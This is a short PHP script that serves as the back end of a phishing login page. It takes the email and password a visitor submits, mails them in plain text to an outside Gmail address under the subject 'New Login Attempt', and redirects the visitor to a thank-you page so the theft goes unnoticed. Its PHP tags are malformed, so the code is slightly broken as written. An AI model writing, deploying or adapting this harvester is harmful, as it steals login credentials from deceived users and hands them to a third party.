<php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    $to = "datarecoveryservicesllc@gmail.com";
    $subject = "New Login Attempt";
    $message = "Email: " . $email . "\nPassword: " . $password;
    $headers = "From: noreply@yourdomain.com";

    mail($to, $subject, $message, $headers);

    // Redirect to a "Login Successful" page or back to login
    header("Location: thank-you.html");
    exit();
}
>
